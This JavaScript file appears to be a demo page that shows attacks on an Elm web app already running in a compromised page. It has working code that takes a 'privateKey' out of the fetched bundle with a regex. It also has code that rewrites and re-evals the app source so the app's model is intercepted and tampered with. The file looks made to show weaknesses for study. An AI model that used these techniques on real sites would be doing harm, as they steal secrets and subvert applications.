(function (body) {
    "use strict";

    console.log("🤬 [body-compromised-after-app-init]");

    function httpGet(url, next) {
        let xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState !== XMLHttpRequest.DONE) {
                return;
            }

            if (xhr.status === 0 || xhr.status >= 200 && xhr.status < 400) {
                next(null, xhr.responseText);
            } else {
                const error = new Error(xhr.responseText);
                error.status = xhr.status;
                error.statusText = xhr.statusText;
                next(error);
            }

            xhr = null;
        };

        xhr.send(null);
    }

    function globalEval(arbitraryCode) {
        // (0, eval)(arbitraryCode);
        // return;

        // https://github.com/jquery/jquery/blob/master/src/core/DOMEval.js
        var preservedScriptAttributes = {
            type: true,
            src: true,
            nonce: true,
            noModule: true
        };

        function DOMEval( code, node, doc ) {
            doc = doc || document;

            var i, val,
            script = doc.createElement( "script" );

            script.text = code;
            if ( node ) {
                for ( i in preservedScriptAttributes ) {

                    // Support: Firefox <=64 - 66+, Edge <=18+
                    // Some browsers don't support the "nonce" property on scripts.
                    // On the other hand, just using `getAttribute` is not enough as
                    // the `nonce` attribute is reset to an empty string whenever it
                    // becomes browsing-context connected.
                    // See https://github.com/whatwg/html/issues/2369
                    // See https://html.spec.whatwg.org/#nonce-attributes
                    // The `node.getAttribute` check was added for the sake of
                    // `jQuery.globalEval` so that it can fake a nonce-containing node
                    // via an object.
                    val = node[ i ] || node.getAttribute && node.getAttribute( i );
                    if ( val ) {
                        script.setAttribute( i, val );
                    }
                }
            }
            doc.head.appendChild( script ).parentNode.removeChild( script );
        }

        DOMEval(arbitraryCode);
    }

    function scenario(name, fn) {
        const storyboard = document.querySelector("#storyboard");
        const scenarioNode = document.createElement("li");
        scenarioNode.classList.add("mt-4");

        const title = document.createElement("h2");
        title.classList.add("font-bold");
        title.classList.add("mb-2");
        title.classList.add("text-2xl");
        title.innerText = name;

        const contentNode = document.createElement("ol");
        contentNode.classList.add("list-decimal");
        contentNode.classList.add("list-inside");

        scenarioNode.appendChild(title);
        scenarioNode.appendChild(contentNode);

        storyboard.appendChild(scenarioNode);

        let lastNode = title;

        fn(function log(line) {
            const node = document.createElement("li");
            node.innerText = line;
            contentNode.appendChild(node);
            lastNode = node;
        }, function remarks() {
            const remarkNode = document.createElement("p");
            remarkNode.classList.add("bg-gray-200");
            remarkNode.classList.add("border-l-4");
            remarkNode.classList.add("border-gray-400");
            remarkNode.classList.add("italic");
            remarkNode.classList.add("mb-2");
            remarkNode.classList.add("pb-1");
            remarkNode.classList.add("pl-2");
            remarkNode.classList.add("pt-1");
            remarkNode.innerText = [].join.call(arguments, " ");
            lastNode.parentNode.insertBefore(remarkNode, lastNode.nextSibling);
        }, globalEval);
    }

    body(scenario, httpGet);

}(function (scenario, httpGet) {

    scenario("Extracting 'privateKey' from the included source code", function (log, remarks) {
        remarks(
            "This attack requires the author to have a look at the document structure and the source code.",
            "It is harder to accomplish with an --optimize build due to record field names being mangled, but not impossible.",
        );

        log("Looking for the script of the Elm app...");
        const script = document.querySelector("[src*='dist\/app']");

        log("Pulling the source via XHR...");
        httpGet(script.src, function (err, code) {
            if (err) {
                throw err;
            }

            log("Got the code, grabbing 'privateKey' via regex...");
            let privateKey = null;
            code.replace(/(?:privateKey|M)\s*:\s*(?:'|")([^"']+)(?:'|")/, function (_, extracted) {
                privateKey = extracted;
            });

            if (privateKey) {
                log("Found the private key: " + privateKey);
            } else {
                log("Could not extract private key");
            }
        });

    });

    scenario("Manipulating the source code and re-initializing a new app instance", function (log, remarks, globalEval) {
        remarks(
            "This attack only works with CSP script-src 'unsafe-inline'."
        );

        log("Looking for the script of the Elm app...");
        const script = document.querySelector("[src*='dist\/app']");

        log("Setting up interceptor function for the app model...");
        window.__interceptModel = function (model) {
            log("Intercepted Elm model " + JSON.stringify(model, null, 2));
            model.isCompromised = true;
            model.I = true;
            console.log("Compromised model", model);
            return model;
        };

        log("Pulling the source via XHR...");
        httpGet(script.src, function (err, code) {
            if (err) {
                throw err;
            }

            function tweak(src) {
                return src.replace(/Elm App/, "Evil Elm App")
                    //.replace(/_Platform_dispatchEffects\(managers, result\.b, subscriptions\(model\)\);/g, "_Platform_dispatchEffects(managers, result.b, subscriptions(window.__interceptModel(model)));")
                    .replace(/var model = result.a;/g, "var model = window.__interceptModel(result.a);")
                    .replace("c=(f=e(f.a)).a", "c=window.__interceptModel((f=e(f.a)).a)");
            }

            log("Got the code, manipulating the source...");
            const manipulated = tweak(code);
            // console.log("manipulated", { manipulated: manipulated });

            log("Deleting the 'Elm' global");
            window.OriginalElm = window.Elm;
            delete window.Elm;

            log("Using 'eval' to set up our evil runtime");
            globalEval(manipulated);

            log("Looking for an init script... (not necessary when the init is bundled with the app)");
            const initScript = document.querySelector("[src*='js\/main']");

            log("Pulling the init script via XHR...");
            httpGet(initScript.src, function (err, initCode) {
                let rootId = null;
                initCode.replace(/querySelector\s*\((?:'|")#([^'"]+)/, function (_, id) {
                    rootId = id;
                });

                log("Setting up the DOM for our evil app...");
                const evilApp = document.createElement("div");
                evilApp.id = rootId;
                document.body.insertBefore(evilApp, document.querySelector("#abstract").nextSibling);

                log("Initializing our evil app via 'eval'...");
                globalEval(initCode);

            });
        });

    });

}));
